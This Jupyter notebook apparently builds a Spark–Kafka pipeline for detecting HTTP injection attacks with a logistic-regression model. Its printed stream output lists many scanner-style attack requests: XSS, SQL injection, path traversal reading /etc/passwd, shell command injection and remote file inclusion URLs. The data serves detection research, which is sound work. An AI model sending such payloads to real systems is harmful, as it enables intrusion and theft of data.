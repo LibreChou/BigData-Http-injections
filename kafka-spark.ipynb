{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Requierments\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip install findspark\n",
    "!pip install confluent-kafka\n",
    "# Downloaded from https://mvnrepository.com/artifact/org.apache.spark/spark-streaming-kafka-0-8-assembly_2.11\n",
    "# !wget https://repo1.maven.org/maven2/org/apache/spark/spark-streaming-kafka-0-8-assembly_2.11/2.4.0/spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import findspark\n",
    "findspark.init('/usr/local/spark/spark-2.4.0-bin-hadoop2.7')\n",
    "os.environ['PYSPARK_SUBMIT_ARGS'] = '--jars spark-streaming-kafka-0-8-assembly_2.11-2.4.0.jar pyspark-shell'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <div>\n",
       "            <p><b>SparkContext</b></p>\n",
       "\n",
       "            <p><a href=\"http://192.168.90.31:4040\">Spark UI</a></p>\n",
       "\n",
       "            <dl>\n",
       "              <dt>Version</dt>\n",
       "                <dd><code>v2.4.0</code></dd>\n",
       "              <dt>Master</dt>\n",
       "                <dd><code>local[*]</code></dd>\n",
       "              <dt>AppName</dt>\n",
       "                <dd><code>BigData</code></dd>\n",
       "            </dl>\n",
       "        </div>\n",
       "        "
      ],
      "text/plain": [
       "<SparkContext master=local[*] appName=BigData>"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pyspark import SparkConf, SparkContext\n",
    "# from operator import add\n",
    "# import sys\n",
    "from pyspark.streaming import StreamingContext\n",
    "from pyspark.streaming.kafka import KafkaUtils\n",
    "import pickle\n",
    "from pyspark.mllib.feature import HashingTF, IDF, StandardScaler\n",
    "from pyspark.mllib.classification import LogisticRegressionModel\n",
    "from pyspark.mllib.linalg import Vectors\n",
    "\n",
    "APP_NAME = \"BigData\"\n",
    "sc = SparkContext(appName=APP_NAME)\n",
    "ssc = StreamingContext(sc, 2)\n",
    "sc"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('./data/hashedTF.pickle', 'rb') as f:\n",
    "    hashingTF = pickle.load(f)\n",
    "    \n",
    "htfVectors = sc.textFile(\"./data/htfVectors\").map(Vectors.parse)\n",
    "idf = IDF().fit(htfVectors)\n",
    "\n",
    "tfidf =  idf.transform(htfVectors)\n",
    "\n",
    "scaler = StandardScaler().fit(tfidf)\n",
    "\n",
    "model = LogisticRegressionModel.load(sc, \"./models/Logistic_Regression\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "topic = \"test\"\n",
    "brokers = \"localhost:9092\"\n",
    "kvs = KafkaUtils.createDirectStream(ssc, [topic], {\"metadata.broker.list\": brokers})\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def to_ngram(payload_obj):\n",
    "    n=2\n",
    "    payload = str(payload_obj)\n",
    "    ngrams = []\n",
    "    for i in range(0,len(payload)-n+1):\n",
    "        ngrams.append(payload[i:i+n])\n",
    "    return ngrams\n",
    "\n",
    "\n",
    "def get_prediction(line):\n",
    "#     try:\n",
    "        \n",
    "    predictions = model.predict(scaler.transform(idf.transform(hashingTF.transform(line.collect()))))\n",
    "    print(len(line.collect()), predictions)\n",
    "#     except : \n",
    "#         print('---------------No data----------------')\n",
    "\n",
    "def print_line(line):\n",
    "    print(line.collect())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('myKey', '/6qbynt4f.asp?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/jnv890lt.jspa?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/6qbynt4f.kspx?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/3hlysl2x.pl?<meta http-equiv=set-cookie content=\"testgjbe=8505\">\\n'), ('myKey', '/main.php?logout=\"ping;-w;11000;-n;1;4.3.2.1&rem;\\n'), ('myKey', '/examples/jsp/cal/calendar_admin.pl?config=|cat /etc/passwd|\\n'), ('myKey', '/cgi-bin/search.jsp?q=%\"<script>alert(1332008604)</script>\\n'), ('myKey', '/rtph263dumpscript/\\n'), ('myKey', '/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=10nbpndw5e2ir1ncx\\n'), ('myKey', '/cgi-bin/mlog.html?screen=/etc/passwd\\n'), ('myKey', '/main.php?stuff=\"&ping\\\\x09-w\\\\x098000\\\\x09-n\\\\x091\\\\x091.2.3.4&rem\\\\x09\\n'), ('myKey', '/examples/jsp/jsp2/jspx/cal_make.pl?p0=../../../../../../../../../etc/passwd\\\\x00\\n'), ('myKey', '/zroo33l4.php?<meta http-equiv=set-cookie content=\"testiklc=904\">\\n'), ('myKey', \"/top.php?stuff='\\\\x0asleep\\\\x097\\\\x09#\\n\"), ('myKey', '/scs86g1p.cfc?<script>document.cookie=\"testquyx=2820;\"</script>\\n'), ('myKey', '/d5a5renl.html?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', '/scripts/mapserv?map=mapserver_detect.nasl.map\\n'), ('myKey', '/javascript/corporate.exe\\n'), ('myKey', '/phpmyadmin/index.php?chemin=../../../../../../..//etc\\n'), ('myKey', '/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>\\n'), ('myKey', '/ju0u7kfo.php?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/shoutbox/expanded.php?conf=../../../../../../../etc/passwd \\n'), ('myKey', '/help.php?q=\"rm\\\\x09q12928131\\\\x09#\\n'), ('myKey', \"/en-us/account/more.php?id=1'\\n\"), ('myKey', '/examples/servlets/servlet/forum_2.php?msg=10&return=<script>foo</script>\\n'), ('myKey', '/m2fpztty.idc?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', '/l13b77e5.htm?<script>document.cookie=\"testjvvf=7721;\"</script>\\n'), ('myKey', '/javascript/.passwd.stackdump\\n'), ('myKey', \"/examples/jsp/num/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x\\n\"), ('myKey', '/javascript/code.exe\\n'), ('myKey', '/manager/activatemember?activatecode=&member=\"><script>alert(\\'mvnforum_activatemember_xss.nasl\\')</script>\\n'), ('myKey', '/o1zj4u9v.asp?<meta http-equiv=set-cookie content=\"testabrn=6368\">\\n'), ('myKey', \"/help.php?q='\\\\x0auname #\\n\"), ('myKey', '/javascript/hit.exe\\n'), ('myKey', '/main.php?stuff=\"ping\\\\x09-w\\\\x0910000\\\\x09-n\\\\x091\\\\x091.2.3.4|rem\\\\x09\\n'), ('myKey', '/subscriptions.doc\\n'), ('myKey', '/include/scripts/run_auto_suspend.cron.php?dir=@rfiurl\\n'), ('myKey', '/nyjgaorz.kspx?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', '<meta http-equiv=set-cookie content=\"testrluj=1420\">\\n'), ('myKey', '/bugs/forgot_password.php?email=\\\\\"><script>alert(document.cookie)</script>\\n')]\n",
      "[('myKey', '/jnt3f86c.dll?<meta http-equiv=set-cookie content=\"testcmax=9270\">\\n'), ('myKey', '/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331919142&lang_crm=../../vtigerservice.php\\\\x00\\n'), ('myKey', '/moodle/filter/tex/texed.php?formdata=foo&pathname=foo\";ls+-l;rm+/tmp/ukirnkmpbn\"\\n'), ('myKey', '/script_path/installation/index.php?mosconfig_absolute_path=http://192.168.202.96:8080/4dckqcc0acprbz??\\n'), ('myKey', '/cgi-914/powerup/r.cgi?file=../../../../../../../../../../etc/passwd\\n'), ('myKey', '/main.php?stuff=&ver,>q61913742&rem,\\n'), ('myKey', '/3j8echh0.php?<meta http-equiv=set-cookie content=\"testfuqi=4189\">\\n'), ('myKey', '/subscriptions.config\\n'), ('myKey', '/tlhhwkvs.exe/\\n'), ('myKey', '/javascript/auth.exe\\n')]\n",
      "[('myKey', '/awstats/awstats.pl?migrate=|echo;chmod 555 /tmp/urcppbumwm0;echo|awstats379091.txt\\n'), ('myKey', '/opensiteadmin/scripts/classes/form.php?path=http://192.168.202.96:8080/4dckqcc0acprbz?\\\\x00\\n'), ('myKey', '/help.php?q=uname >q18373347 #\\n'), ('myKey', '/lib/adodb_lite/adodb-perf-module.inc.php?last_module=zzz_adoconnection{}system(id);class zzz_adoconnection{}//\\n'), ('myKey', '/speech-transcript/\\n'), ('myKey', '/zv8tv7h8.do?<script>document.cookie=\"testcqwz=9752;\"</script>\\n'), ('myKey', '/t7tm4m0b.aspx?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', \"/manager/index.php?op=default&date=200607' union select 1,1128524552,1,1,1,1,1,1,1,1--&blogid=1\\n\"), ('myKey', \"/help.php?q='\\\\x0adel\\\\x09q47355772\\\\x09#\\n\"), ('myKey', '/examples/jsp/sessions/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>\\n')]\n",
      "[('myKey', '/m2fpztty.html?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/phpmyadmin/sawmillcl.exe?ho+{complete_version}\\n'), ('myKey', '/sscript/\\n'), ('myKey', '/cgi-bin/webplus?script=/../../../../etc/passwd\\n'), ('myKey', '/subscriptions.part\\n'), ('myKey', '/g8nu2yy7.jspa?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', \"/top.php?stuff=';rm q26271527 #\\n\"), ('myKey', '/scripts/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\\\\x00\\n'), ('myKey', '/7dbjwpw6.cfm?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', \"/cgibin/pfdispaly.cgi?'\\\\x0a/bin/cat /etc/passwd|'\\n\")]\n",
      "[('myKey', '/top.php?stuff=\"ping -w 7000 -n 1 1.2.3.4&rem \\n'), ('myKey', \"/cgi-bin/index.php?p='nessus\\n\"), ('myKey', '/main.php?stuff=\"sleep 11 #\\n'), ('myKey', '/en-us/odzk29aa.nsf?<script>document.cookie=\"testtfvh=2141;\"</script>\\n'), ('myKey', '/scripts/prnnucptkixl.php\\n'), ('myKey', '/ju0u7kfo.nsf?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/ydexw8by.x?<meta http-equiv=set-cookie content=\"testulex=4996\">\\n'), ('myKey', '/main.php?logout=\"&uname >q45435148 #\\n'), ('myKey', '/cgi-win/ion-p?page=../../../../../etc/passwd\\n'), ('myKey', '/cgibin/gw5/gwweb.exe?help=bad-request\\n')]\n",
      "[('myKey', '/j4rdyhw8.fts?<script>document.cookie=\"testrluj=1420;\"</script>\\n'), ('myKey', \"/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/djjeroppey.sh'); function v\\n\"), ('myKey', '/scripts/ylrvly9nh_pf.inc\\n'), ('myKey', \"/scripts/index.php?op=default&date=200607' union select 1,1100287420,1,1,1,1,1,1,1,1--&blogid=1\\n\"), ('myKey', '/scripts/vhost.php?action=logout&time=1331908735\\n'), ('myKey', '/scripts/kfzqb5x87lvq.pl\\n'), ('myKey', '/newsletter_log.php?logfile=info.php&logtime=000060&email=<?php echo md5(\"test\"); ?>\\n'), ('myKey', '/ao22ww7y.do?<script>document.cookie=\"testqppc=8767;\"</script>\\n'), ('myKey', '/javascript/globals.exe\\n'), ('myKey', '/b5xdqgz2.exe?<script>cross_site_scripting.nasl</script>\\n')]\n",
      "[('myKey', '/jw64yq8u.x?<meta http-equiv=set-cookie content=\"testylfu=1313\">\\n'), ('myKey', '/scripts/gitweb.pl\\n'), ('myKey', \"/main.php?logout='&del q16695623 #\\n\"), ('myKey', '/scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331919202\\n'), ('myKey', '/uvazfs7p.pl?<meta http-equiv=set-cookie content=\"testwtbo=4831\">\\n'), ('myKey', '/cgi-bin/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params\"having 1=1\\n'), ('myKey', \"/examples/jsp/error/faq.php?action=&type=view&s=&id=-1' union select 0,157871866,0,0,0,0,0--\\n\"), ('myKey', \"/top.php?stuff='\\\\x0auname\\\\x09>q23871271\\\\x09#\\n\"), ('myKey', \"/manager/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- \\n\"), ('myKey', '/javascript/subscription.exe\\n')]\n",
      "[('myKey', '/ju0u7kfo.asp?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/manager/admin/addentry.php?phpbb_root_path=/etc/passwd\\\\x00\\n'), ('myKey', '/recordings/index.php?chemin=../../../../../../..//etc\\n'), ('myKey', \"/en-us/account/home/search.asp?nchannel='1\\n\"), ('myKey', '/javascript/_vti_cnf.exe\\n'), ('myKey', '/0qhcnefz.aspx?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', '/ssxmagazinesubscription/\\n'), ('myKey', '/en-us/<img src=\"javascript:alert(cross_site_scripting.nasl);\">.dll\\n'), ('myKey', '/examples/servlets/servlet/admin/components/com_fm/fm.install.php?lm_absolute_path=../../../&install_dir=limbo_com_fm_php_shell.nasl-1331904435\\n'), ('myKey', '/examples/jsp/checkbox/newsscript.pl?mode=admin\\n')]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('myKey', '/en-us/ddoworrl.asp?<script>document.cookie=\"testvlau=8517;\"</script>\\n'), ('myKey', '/javascript/resolution.exe\\n'), ('myKey', '/examples/jsp/jsp2/jspx/include/sql.php?include_path=/etc/passwd\\\\x00\\n'), ('myKey', '/scripts/vzdybnanqpc3.inc\\n'), ('myKey', '/\\\\x80../\\\\x80../\\\\x80../\\\\x80../\\\\x80../\\\\x80../winnt/win.ini\\n'), ('myKey', '/fcgi-bin/windmail.exe? -n c:\\\\boot.ini hacker@hax0r.com | dir c:\\\\\\\\\\n'), ('myKey', '/cgis/windmail.exe? -n c:\\\\boot.ini hacker@hax0r.com | dir c:\\\\\\\\\\n'), ('myKey', '/javascript/programs.exe\\n'), ('myKey', '/help.php?q=&uname\\\\x09>q82939622\\\\x09#\\n'), ('myKey', '/t3af3tdz.dll?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n')]\n",
      "[('myKey', '/scripts/index.php?board=nonexistant1419816536\\n'), ('myKey', '/b5xdqgz2.php3?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/bn857frh.aspx?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/s7qus4g3.cfm?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/scgi-bin/.htpasswd\\n'), ('myKey', '/phpmyadmin/starnet/modules/sn_allbum/slideshow.php?cmsdir=/etc/passwd\\\\x00\\n'), ('myKey', '/en-us/account/a1stats/a1disp3.cgi?/../../../../../../etc/passwd\\n'), ('myKey', '/recordings/admin/general.php?mode=perlinfo&config[general][perl_binary]=cat /etc/passwd||\\n'), ('myKey', '/dslpwt15.do?<script>document.cookie=\"testtkio=5454;\"</script>\\n'), ('myKey', \"/mom's ass/\\n\")]\n",
      "[('myKey', '/javascript/1994.exe\\n'), ('myKey', '/scripts/qg9h0c0svvat.sh\\n'), ('myKey', '/606wkcop.kspx?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/en-us/s7qus4g3.cfm?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', '/vhzmaia2.cfm?<meta http-equiv=set-cookie content=\"testkogj=3979\">\\n'), ('myKey', '/javascript/htpasswd.pl\\n'), ('myKey', '/main.php?stuff=\"&ping,-w,11000,-n,1,1.2.3.4&rem,\\n'), ('myKey', '/i2n4v4rl.htm?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', \"/postnuke/html/modules.php?op=modload&name=news&file=article&sid=<script>alert('vulnerable');</script>\\n\"), ('myKey', '/scripts/search.scr.php?globals[pth][classes]=http://cirt.net/rfiinc.txt??\\n')]\n",
      "[('myKey', \"/en-us/account/index.php?act=arcade&do=stats&gameid=1'\\n\"), ('myKey', '/g8nu2yy7.kspx?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', '/javascript/document.sfish\\n'), ('myKey', '/help.php?q=\"ping\\\\xa0-w\\\\xa08000\\\\xa0-n\\\\xa01\\\\xa04.3.2.1&rem\\\\xa0\\n'), ('myKey', '/7dbjwpw6.nsf?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', '/ny1b3qq4.x?<script>cross_site_scripting.nasl</script>\\n'), ('myKey', \"/faq.php?action=&type=view&s=&id=-1' union select 0,1323875856,0,0,0,0,0--\\n\"), ('myKey', '/scs86g1p.cfc?<meta http-equiv=set-cookie content=\"testquyx=2820\">\\n'), ('myKey', '/cgi-home/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|\\n'), ('myKey', '/oncixdescription/\\n')]\n",
      "[('myKey', '/en-us/oie504mr.x?<script>document.cookie=\"testtpby=7052;\"</script>\\n'), ('myKey', '/main.php?logout=&ping;-w;7000;-n;1;4.3.2.1&rem;\\n'), ('myKey', '/search.jsp?q=%\"<script>alert(1331905049)</script>\\n'), ('myKey', '/scripts/man-cgi?section=0&topic=ls;id\\n'), ('myKey', '/xsskj3/\\n'), ('myKey', \"/main.php?stuff='\\\\x0auname\\\\x09>q47233887\\\\x09#\\n\"), ('myKey', '/examples/jsp/jsp2/el/autohtml.php?op=modload&mailfile=x&name=../../../../../../../../etc/passwd\\n'), ('myKey', '/1r8cfrlf.kspx?<meta http-equiv=set-cookie content=\"testydan=5106\">\\n'), ('myKey', '/scripts/mensajeitor.php\\n'), ('myKey', '/passwdage/\\n')]\n",
      "[('myKey', '/en-us/splunk_413_404error_xss.nasl-1331904921\\n'), ('myKey', '/bl8sefdm.jspa?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', \"/banners.php?op=emailstats&cid=1 and passwd like 'a%'/*\\n\"), ('myKey', '/script/\\n'), ('myKey', '/scripts/breakcal/calendar.cgi\\n'), ('myKey', '/javascript/pipermail.exe\\n'), ('myKey', \"/examples/jsp/checkbox/index.php?id='union/**/select/**/0,0,1364632458,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--\\n\"), ('myKey', '/bmeun223.cfm?<script>document.cookie=\"testhhwu=7044;\"</script>\\n'), ('myKey', '/t3af3tdz.do?<img src=\"javascript:alert(cross_site_scripting.nasl);\">\\n'), ('myKey', '/yef5f3d5.jsp?<meta http-equiv=set-cookie content=\"testcrcv=6167\">\\n')]\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-6-3f59c02e78db>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0mkvs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mforeachRDD\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mprint_line\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0mssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstart\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 7\u001b[0;31m \u001b[0mssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mawaitTermination\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/pyspark/streaming/context.py\u001b[0m in \u001b[0;36mawaitTermination\u001b[0;34m(self, timeout)\u001b[0m\n\u001b[1;32m    190\u001b[0m         \"\"\"\n\u001b[1;32m    191\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mtimeout\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 192\u001b[0;31m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_jssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mawaitTermination\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    193\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    194\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_jssc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mawaitTerminationOrTimeout\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtimeout\u001b[0m \u001b[0;34m*\u001b[0m \u001b[0;36m1000\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/lib/py4j-0.10.7-src.zip/py4j/java_gateway.py\u001b[0m in \u001b[0;36m__call__\u001b[0;34m(self, *args)\u001b[0m\n\u001b[1;32m   1253\u001b[0m             \u001b[0mproto\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mEND_COMMAND_PART\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1254\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1255\u001b[0;31m         \u001b[0manswer\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mgateway_client\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend_command\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcommand\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1256\u001b[0m         return_value = get_return_value(\n\u001b[1;32m   1257\u001b[0m             answer, self.gateway_client, self.target_id, self.name)\n",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/lib/py4j-0.10.7-src.zip/py4j/java_gateway.py\u001b[0m in \u001b[0;36msend_command\u001b[0;34m(self, command, retry, binary)\u001b[0m\n\u001b[1;32m    983\u001b[0m         \u001b[0mconnection\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_get_connection\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    984\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 985\u001b[0;31m             \u001b[0mresponse\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mconnection\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msend_command\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcommand\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    986\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0mbinary\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    987\u001b[0m                 \u001b[0;32mreturn\u001b[0m \u001b[0mresponse\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_create_connection_guard\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mconnection\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m/usr/local/spark/spark-2.4.0-bin-hadoop2.7/python/lib/py4j-0.10.7-src.zip/py4j/java_gateway.py\u001b[0m in \u001b[0;36msend_command\u001b[0;34m(self, command)\u001b[0m\n\u001b[1;32m   1150\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1151\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m-> 1152\u001b[0;31m             \u001b[0manswer\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msmart_decode\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstream\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreadline\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m   1153\u001b[0m             \u001b[0mlogger\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdebug\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"Answer received: {0}\"\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mformat\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0manswer\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m   1154\u001b[0m             \u001b[0;32mif\u001b[0m \u001b[0manswer\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstartswith\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mproto\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mRETURN_MESSAGE\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/anaconda3/lib/python3.7/socket.py\u001b[0m in \u001b[0;36mreadinto\u001b[0;34m(self, b)\u001b[0m\n\u001b[1;32m    587\u001b[0m         \u001b[0;32mwhile\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    588\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 589\u001b[0;31m                 \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_sock\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv_into\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mb\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    590\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mtimeout\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    591\u001b[0m                 \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_timeout_occurred\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "#lines = ssc.socketTextStream(\"localhost\", 9092)\n",
    "# ngrams = kvs.flatMap(lambda x : to_ngram(x))\n",
    "# ngrams = kvs.flatMap(to_ngram)\n",
    "# ngrams.foreachRDD(get_prediction)\n",
    "kvs.foreachRDD(print_line)\n",
    "ssc.start()\n",
    "ssc.awaitTermination()  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
